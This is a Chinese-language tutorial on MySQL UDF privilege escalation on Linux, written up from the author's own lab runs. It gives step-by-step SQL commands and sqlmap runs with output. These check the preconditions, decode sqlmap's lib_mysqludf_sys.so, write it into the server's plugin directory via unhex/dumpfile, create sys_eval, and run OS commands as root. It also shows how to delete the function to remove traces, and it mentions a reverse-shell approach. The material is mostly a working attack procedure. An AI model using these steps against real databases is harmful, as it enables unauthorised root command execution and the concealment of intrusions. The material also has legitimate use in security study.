# linux环境下的MySQL UDF提权

##1. 背景介绍

###UDF

[UDF](https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html)（user defined function）用户自定义函数,是MySQL的一个扩展接口，称为用户自定义函数,是用来拓展MySQL的技术手段，用户通过自定义函数来实现在MySQL中无法实现的功能。文件后缀为`.dll`或`.so`,常用c语言编写。拿到一个WebShell之后，在利用操作系统本身存在的漏洞提权的时候发现补丁全部被修补。这个时候需要利用第三方应用提权。当MYSQL权限比较高的时候我们就可以利用udf提权。

###利用前提

- mysql允许导入导出文件
- 高权限用户启动，如root。该账号需要有对数据库`mysql`的insert和delete权限，其实是操作里面的`func`表，所以`func`表也必须存在。
- 未开启`‑‑skip‑grant‑tables`。开启的情况下，UDF不会被加载，默认不开启。

### 实验环境

手工启动mysql，指定root启动：mysqld_safe --user=root。默认是mysql用户启动。

##2. 未GetShell的情况

> 适用情况：目标主机开启MySQL远程连接，并且已经获得MySQL数据库连接的用户名和密码信息

###2.1 手工提权

#### 判断前提条件

1. 查看是否允许导入导出文件

   ```
   mysql> show variables like "%secure_file_priv%";
   +------------------+-------+
   | Variable_name    | Value |
   +------------------+-------+
   | secure_file_priv |       |
   +------------------+-------+
   1 row in set (0.01 sec)
   ```

   这个参数（https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv）在MySQL数据库的安装目录的 my.ini 文件中配置，也可以作为启动参数。

   > secure_file_priv是用来限制load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限。
   >
   > 当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权
   > 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权
   >  当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权

2. 查看是否高权限

   ```
   mysql> select * from mysql.user where user = substring_index(user(), '@', 1) ;
   ```

3. 查看plugin的值

   ```
   mysql> select host,user,plugin from mysql.user where user = substring_index(user(),'@',1);
   +-----------+------+-----------------------+
   | host      | user | plugin                |
   +-----------+------+-----------------------+
   | localhost | root | mysql_native_password |
   +-----------+------+-----------------------+
   1 row in set (0.02 sec)
   ```

   plugin值表示mysql用户的认证方式。当 plugin 的值为空时不可提权，为 `mysql_native_password` 时可通过账户连接提权。默认为`mysql_native_password`。另外，mysql用户还需对此plugin目录具有写权限。

#### 上传udf库文件

1. 获取plugin路径

```
mysql> show variables like "%plugin%";
+-------------------------------+--------------------------------------------+
| Variable_name                 | Value                                      |
+-------------------------------+--------------------------------------------+
| default_authentication_plugin | mysql_native_password                      |
| plugin_dir                    | /usr/local/Cellar/mysql/5.7.22/lib/plugin/ |
+-------------------------------+--------------------------------------------+
2 rows in set (0.02 sec)
```

2. 获取服务器版本信息

```
mysql> show variables like 'version_compile_%';
+-------------------------+----------+
| Variable_name           | Value    |
+-------------------------+----------+
| version_compile_machine | x86_64   |
| version_compile_os      | osx10.13 |
+-------------------------+----------+
2 rows in set (0.01 sec)
```

3. 准备udf库文件

需要选择对应的版本，否则会报错。

- 从sqlmap获取

  sqlmap中有现成的udf文件。分别是32位和64位的。这里选择`sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_`。

  不过这里的so是异或过的，需要执行以下命令解密：

  ```
  cd sqlmap/extra/cloak
  
  python3 cloak.py -d -i /security/ctf/tools_bar/4_注入攻击/SQLI/sqlmap-dev/data/udf/mysql/linux/64/lib_mysqludf_sys.so_
  ```

  此时会在相同目录生成解密后的lib_mysqludf_sys.so。

- 从metasploit中获取

  在kali的`/usr/share/metasploit-framework/data/exploits/mysql`目录下找到相应的库即可。

  *这个库和sqlmap解密后的一模一样。*

- 自行编译

​		下载[lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys)

4. 上传udf库文件

   1. 获取库文件的16进制

           ```
   # 这里的mysql交互命令行是本地的，随意开一个就行
   mysql> select hex(load_file('/security/ctf/tools_bar/4_注入攻击/SQLI/sqlmap-dev/data/udf/mysql/linux/64/lib_mysqludf_sys.so')) into outfile '/tmp/udf.txt';
   Query OK, 1 row affected (0.03 sec)
           ```

   2. 上传库文件

   ```
   # 这里的mysql交互命令行是目标数据库，7F454C46020打头的参数即/tmp/udf.txt的内容（注意去掉最后的换行）
   mysql> select unhex('7F454C46020...') into dumpfile '/usr/local/Cellar/mysql/5.7.22/lib/plugin/mysqludf.so';
   Query OK, 1 row affected (0.04 sec)
   ```

   上传库文件也可以通过临时表中转的方式，此处略。

#### 创建函数

1. 先在**本地**查看有哪些函数可用

```
nm -D lib_mysqludf_sys.so
                 w _Jv_RegisterClasses
0000000000201788 A __bss_start
                 w __cxa_finalize
                 w __gmon_start__
0000000000201788 A _edata
0000000000201798 A _end
0000000000001178 T _fini
0000000000000ba0 T _init
                 U fgets
                 U fork
                 U free
                 U getenv
000000000000101a T lib_mysqludf_sys_info
0000000000000da4 T lib_mysqludf_sys_info_deinit
0000000000001047 T lib_mysqludf_sys_info_init
                 U malloc
                 U mmap
                 U pclose
                 U popen
                 U realloc
                 U setenv
                 U strcpy
                 U strncpy
0000000000000dac T sys_bineval
0000000000000dab T sys_bineval_deinit
0000000000000da8 T sys_bineval_init
0000000000000e46 T sys_eval
0000000000000da7 T sys_eval_deinit
0000000000000f2e T sys_eval_init
0000000000001066 T sys_exec
0000000000000da6 T sys_exec_deinit
0000000000000f57 T sys_exec_init
00000000000010f7 T sys_get
0000000000000da5 T sys_get_deinit
0000000000000fea T sys_get_init
000000000000107a T sys_set
00000000000010e8 T sys_set_deinit
0000000000000f80 T sys_set_init
                 U sysconf
                 U system
                 U waitpid


```

2. 创建`sys_eval`函数

```
mysql> create function sys_eval returns string soname "mysqludf.so";
Query OK, 0 rows affected (0.03 sec)
mysql>
```

3. 函数操作

```
# 调用函数
mysql> select sys_eval('whoami');
+--------------------+
| sys_eval('whoami') |
+--------------------+
| root               |
+--------------------+
1 row in set (0.03 sec)

# 查看函数
mysql> select * from mysql.func;
+----------+-----+-------------+----------+
| name   | ret | dl     | type   |
+----------+-----+-------------+----------+
| sys_eval |  0 | mysqludf.so | function |
+----------+-----+-------------+----------+
1 row in set

# 删除函数（清除痕迹）,如果要删除函数,必须udf文件还存在plugin目录下
drop function sys_eval;
或
delete from mysql.func where name='sys_eval';
```

### 2.2 利用sqlmap

####全自动化

```
sqlmap.py -d "mysql://root:root@172.20.10.9:3306/mysql" --os-shell

...
[11:53:40] [INFO] connection to MySQL server '172.20.10.9:3306' established
[11:53:40] [INFO] testing MySQL
[11:53:40] [INFO] confirming MySQL
[11:53:40] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[11:53:40] [INFO] fingerprinting the back-end DBMS operating system
[11:53:40] [INFO] the back-end DBMS operating system is Linux
[11:53:40] [INFO] testing if current user is DBA
[11:53:40] [INFO] fetching current user
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 2
[11:53:45] [INFO] checking if UDF 'sys_exec' already exist
[11:53:45] [INFO] checking if UDF 'sys_eval' already exist
[11:53:50] [INFO] detecting back-end DBMS version from its banner
[11:53:50] [INFO] the local file '/var/folders/bx/zb9__nb1591g_r8k78p5p0gr0000gn/T/sqlmap_5_qd1_y51533/lib_mysqludf_sysp478pm69.so' and the remote file './libsoxbd.so' have the same size (8040 B)
[11:53:50] [INFO] creating UDF 'sys_exec' from the binary UDF file
[11:53:50] [INFO] creating UDF 'sys_eval' from the binary UDF file
[11:53:50] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[11:53:50] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a]

No output
os-shell>
```

没有得到执行结果，查看func表也没有udf记录，未找到原因。

####半自动化

1. 获取plugin目录

   ```
   python3 sqlmap.py -d "mysql://root:@172.20.10.9:3306/mysql" --sql-shell
           ___
          __H__
    ___ ___[']_____ ___ ___  {1.4.2.24#dev}
   |_ -| . [']     | .'| . |
   |___|_  [)]_|_|_|__,|  _|
         |_|V...       |_|   http://sqlmap.org
   
   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
   
   [*] starting @ 13:21:33 /2020-02-10/
   
   [13:21:34] [INFO] connection to MySQL server '172.20.10.9:3306' established
   [13:21:34] [INFO] testing MySQL
   [13:21:34] [INFO] resumed: [['1']]...
   [13:21:34] [INFO] confirming MySQL
   [13:21:34] [INFO] resumed: [['1']]...
   [13:21:34] [INFO] the back-end DBMS is MySQL
   back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
   [13:21:34] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
   sql-shell> select @@plugin_dir;
   [13:22:06] [INFO] fetching SQL SELECT statement query output: 'select @@plugin_dir'
   select @@plugin_dir [1]:
   [*] /usr/lib/x86_64-linux-gnu/mariadb18/plugin/
   
   sql-shell>
   ```

   得到plugin目录为`/usr/lib/x86_64-linux-gnu/mariadb18/plugin/`。

2. 上传lib_mysqludf_sys到plugin目录

   ```
   python3 sqlmap.py -d "mysql://root:@172.20.10.9:3306/mysql" --file-write=/Users/simon/Downloads/lib_mysqludf_sys_64.so --file-dest=/usr/lib/x86_64-linux-gnu/mariadb18/plugin/lib_mysqludf_sys_64.so
           ___
          __H__
    ___ ___[.]_____ ___ ___  {1.4.2.24#dev}
   |_ -| . ["]     | .'| . |
   |___|_  [(]_|_|_|__,|  _|
         |_|V...       |_|   http://sqlmap.org
   
   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
   
   [*] starting @ 13:28:35 /2020-02-10/
   
   [13:28:36] [INFO] connection to MySQL server '172.20.10.9:3306' established
   [13:28:36] [INFO] testing MySQL
   [13:28:36] [INFO] resumed: [['1']]...
   [13:28:36] [INFO] confirming MySQL
   [13:28:36] [INFO] resumed: [['1']]...
   [13:28:36] [INFO] the back-end DBMS is MySQL
   back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
   [13:28:36] [INFO] fingerprinting the back-end DBMS operating system
   [13:28:36] [INFO] resumed: [['0']]...
   [13:28:36] [INFO] the back-end DBMS operating system is Linux
   do you want confirmation that the local file '/Users/simon/Downloads/lib_mysqludf_sys_64.so' has been successfully written on the back-end DBMS file system ('/usr/lib/x86_64-linux-gnu/mariadb18/plugin/lib_mysqludf_sys_64.so')? [Y/n]
   
   [13:28:42] [INFO] the local file '/Users/simon/Downloads/lib_mysqludf_sys_64.so' and the remote file '/usr/lib/x86_64-linux-gnu/mariadb18/plugin/lib_mysqludf_sys_64.so' have the same size (8040 B)
   [13:28:42] [INFO] connection to MySQL server '172.20.10.9:3306' closed
   
   [*] ending @ 13:28:42 /2020-02-10/
   ```

3. 创建&执行函数

   ```
   python3 sqlmap.py -d "mysql://root:@172.20.10.9:3306/mysql" --sql-shell
           ___
          __H__
    ___ ___[,]_____ ___ ___  {1.4.2.24#dev}
   |_ -| . [)]     | .'| . |
   |___|_  [)]_|_|_|__,|  _|
         |_|V...       |_|   http://sqlmap.org
   
   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
   
   [*] starting @ 13:32:23 /2020-02-10/
   
   [13:32:23] [INFO] connection to MySQL server '172.20.10.9:3306' established
   [13:32:23] [INFO] testing MySQL
   [13:32:23] [INFO] resumed: [['1']]...
   [13:32:23] [INFO] confirming MySQL
   [13:32:23] [INFO] resumed: [['1']]...
   [13:32:23] [INFO] the back-end DBMS is MySQL
   back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
   [13:32:23] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
   sql-shell> create function sys_eval returns string soname 'lib_mysqludf_sys_64.so'
   [13:34:56] [INFO] executing SQL data definition statement: 'create function sys_eval returns string soname 'lib_mysqludf_sys_64.so''
   create function sys_eval returns string soname 'lib_mysqludf_sys_64.so': 'NULL'
   sql-shell> select sys_eval('whoami');
   [13:35:59] [INFO] fetching SQL SELECT statement query output: 'select sys_eval('whoami')'
   select sys_eval('whoami') [1]:
   [*] root
   
   sql-shell>
   ```

   > sqlmap中的udf文件提供的函数：
   >
   > sys_eval，执行任意命令，并将输出返回。 
   >
   > sys_exec，执行任意命令，并将退出码返回。 
   >
   > sys_get，获取一个环境变量。
   >
   > sys_set，创建或修改一个环境变量。
   >
   > ...

### 2.3 利用HackMySQL

以前叫Python_FuckMySQL，仅适用于目标系统为windows，故略。

https://github.com/T3st0r-Git/HackMySQL

https://github.com/v5est0r/Python_FuckMySQL

##3. GetShell的情况

> 适用情况：已经通过一句话木马等GetShell，并且得到了数据库用户名、密码。

###上传含udf提权功能的大马提权

手上的提权木马都是针对windows的，且都是php5。而实验环境是Kali+php7，故未实操。

文章可参考以下：

https://mp.weixin.qq.com/s/URPJPbmRixfWPKFDaX1qFA

http://zone.secevery.com/article/1096

###反弹shell

思路：通过getshell反弹shell后，在反弹回来的shell中连接mysql，然后进行手工提权。

结果：失败，在反弹回来的shell中无法成功连接mysql。